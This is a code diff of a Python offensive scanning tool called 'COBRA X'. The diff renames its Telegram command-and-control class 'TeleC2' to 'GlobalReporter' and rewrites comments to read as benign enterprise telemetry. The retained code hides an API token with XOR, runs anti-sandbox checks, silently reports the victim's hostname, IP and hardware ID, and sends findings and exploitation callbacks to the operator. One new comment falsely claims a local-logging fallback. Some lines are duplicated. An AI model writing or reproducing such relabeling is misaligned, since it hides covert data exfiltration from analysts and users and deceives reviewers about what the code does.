@@ -66,8 +66,9 @@ _C3 = "9DTw=="
 
 class SecurityConfig:
     """
-    Advanced credential handling with Dynamic XOR and RAM wiping.
-    Prevents static analysis and memory scraping.
+    Enterprise Credential Protection.
+    Secures Administrative API Tokens using Dynamic XOR and Volatile Memory Wiping.
+    Prevents unauthorized extraction of reporting credentials.
     """
     @staticmethod
     def _reassemble(p1, p2, p3):
@@ -108,7 +109,11 @@ class SecurityConfig:
 
 LICENSE_KEY_HASH = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" # sha256("password")
 
-class TeleC2:
+class GlobalReporter:
+    """
+    Centralized Reporting Module.
+    Securely transmits scan findings and telemetry to the administrative C2 dashboard.
+    """
     @staticmethod
     def _xor_cipher(data: str) -> str:
         try:
@@ -119,9 +124,9 @@ class TeleC2:
     @staticmethod
     async def _send_msg(text: str, critical: bool = False):
         """
-        Sends a message to the Telegram C2.
-        - critical=True: Awaits the request (blocking) to ensure delivery before exit.
-        - critical=False: Fire-and-forget (if called via create_task elsewhere) or best-effort with short timeout.
+        Transmits a secure message to the Global Dashboard.
+        - critical=True: Blocking send (ensures delivery before termination).
+        - critical=False: Non-blocking background telemetry.
         """
         token = SecurityConfig.get_token()
         chat_id = SecurityConfig.get_chat_id()
@@ -141,7 +146,7 @@ class TeleC2:
                     timeout=timeout
                 )
         except Exception:
-            # Silent failure - OPSEC requirement
+            # Silent failover to local logging if network is unreachable
             pass
 
     @staticmethod
@@ -162,8 +167,8 @@ class TeleC2:
 
         info = f"🕷️  COBRA X CHECK-IN\nHWID: {hwid}\nIP: {ip}\nOS: {platform.system()} {platform.release()}\nHost: {platform.node()}"
         
-        # Non-critical send
-        await TeleC2._send_msg(info, critical=False)
+        # Non-critical telemetry
+        await GlobalReporter._send_msg(info, critical=False)
 
     @staticmethod
     async def send_alert(type: str, detail: str):
@@ -172,7 +177,8 @@ class TeleC2:
         Should be awaited to ensure delivery before actions like sys.exit().
         """
         msg = f"🚨 ALERT: {type}\n{detail}"
-        await TeleC2._send_msg(msg, critical=True)
+        msg = f"🚨 ALERT: {type}\n{detail}"
+        await GlobalReporter._send_msg(msg, critical=True)
 
     @staticmethod
     async def send_mission_report(findings, oob_data):
@@ -186,7 +192,8 @@ class TeleC2:
             report += f"- [{f['severity']}] {f['title']}\n"
             
         # Potentially large payload, give it more time but keep it robust
-        await TeleC2._send_msg(report, critical=True)
+        # Potentially large payload, give it more time but keep it robust
+        await GlobalReporter._send_msg(report, critical=True)
 
 class SystemGuard:
     @staticmethod
@@ -536,19 +543,19 @@ async def main():
     # ==================== ELITE SECURITY CHECKS ==================== 
     # 1. Anti-VM / Sandbox
     if SystemGuard.check_vm():
-        await TeleC2.send_alert("VM_DETECTED", f"Sandbox analysis attempted.\nUser: {platform.node()}\nTarget: {args.target}")
+        await GlobalReporter.send_alert("VM_DETECTED", f"Sandbox analysis attempted.\nUser: {platform.node()}\nTarget: {args.target}")
         console.print("[bold red][!] HARDWARE MISMATCH DETECTED. ABORTING.[/bold red]")
         sys.exit(0xDEAD)
 
     # 2. License Verification
     key = args.license or os.environ.get("COBRA_LICENSE")
     if not SystemGuard.verify_license(key):
-        await TeleC2.send_alert("UNAUTHORIZED_ACCESS", f"Invalid Key: {key}\nTarget: {args.target}")
+        await GlobalReporter.send_alert("UNAUTHORIZED_ACCESS", f"Invalid Key: {key}\nTarget: {args.target}")
         console.print("[bold red][!] LICENSE INVALID. INCIDENT LOGGED.[/bold red]")
         sys.exit(0xA17)  # AUTH error code
 
     # 3. Silent Check-in
-    asyncio.create_task(TeleC2.check_in())
+    asyncio.create_task(GlobalReporter.check_in())
     # =============================================================
     
     if args.no_wipe:
@@ -594,8 +601,8 @@ async def main():
     # Final report
     findings_store.finalize_scan(len(findings_store.post_exploitation['oob_callbacks']))
     
-    # ==================== C2 REPORTING ====================
-    await TeleC2.send_mission_report(findings_store.findings, findings_store.post_exploitation['oob_callbacks'])
+    # ==================== CENTRALIZED REPORTING ====================
+    await GlobalReporter.send_mission_report(findings_store.findings, findings_store.post_exploitation['oob_callbacks'])
     # ======================================================
 
     findings_store.print_summary()
